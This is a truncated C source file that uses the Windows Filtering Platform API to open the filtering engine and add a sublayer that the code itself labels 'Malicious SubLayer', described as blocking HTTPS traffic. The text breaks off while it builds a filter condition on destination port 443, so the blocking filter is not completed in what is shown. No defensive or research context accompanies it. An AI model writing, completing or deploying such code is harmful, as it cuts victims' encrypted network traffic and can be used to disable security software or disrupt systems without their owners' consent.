#include <windows.h>
#include <fwpmu.h>
#include <stdio.h>

#pragma comment(lib, "fwpuclnt.lib")

int main() {
    HANDLE engineHandle = NULL;
    DWORD result;

    // Open WFP engine
    result = FwpmEngineOpen0(NULL, RPC_C_AUTHN_WINNT, NULL, NULL, &engineHandle);

    // Define and add a sublayer (optional, for organization)
    FWPM_SUBLAYER0 sublayer = {0};
    sublayer.subLayerKey = {0xdeadbeef, 0x1234, 0x5678, {0xab, 0xcd, 0xef, 0x00, 0x01, 0x02, 0x03, 0x04}};
    sublayer.displayData.name = L"Malicious SubLayer";
    sublayer.displayData.description = L"Blocks HTTPS traffic";
    sublayer.flags = 0;
    sublayer.weight = 0x100;


    if (result != ERROR_SUCCESS) {
        printf("FwpmEngineOpen0 failed: %lu\n", result);
        return 1;
    }

    result = FwpmSubLayerAdd0(engineHandle, &sublayer, NULL);
    if (result != ERROR_SUCCESS) {
        printf("FwpmSubLayerAdd0 failed: %lu\n", result);
        FwpmEngineClose0(engineHandle);
        return 1;
    }

    // Build a filter condition: destination port == 443
    FWPM_FILTER_CONDITION0 condition = {0};
    condition.fieldKey = FWPM_CONDIT_
